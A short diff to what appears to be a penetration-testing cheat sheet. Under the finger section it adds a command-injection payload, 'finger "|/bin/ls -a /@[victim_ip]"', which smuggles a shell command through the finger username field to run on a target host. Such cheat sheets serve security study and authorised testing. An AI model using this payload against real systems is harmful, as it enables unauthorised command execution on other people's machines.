@@ -185,6 +185,11 @@ A Records: Give us IP-address for a particular domain
 ```
 finger [username]@[ip]
 ```
+
+####
+```
+finger "|/bin/ls -a /@[victim_ip]"
+```
 --------------------------------------------------------------------------------------------------------------------------------
 ## HTTP 
 
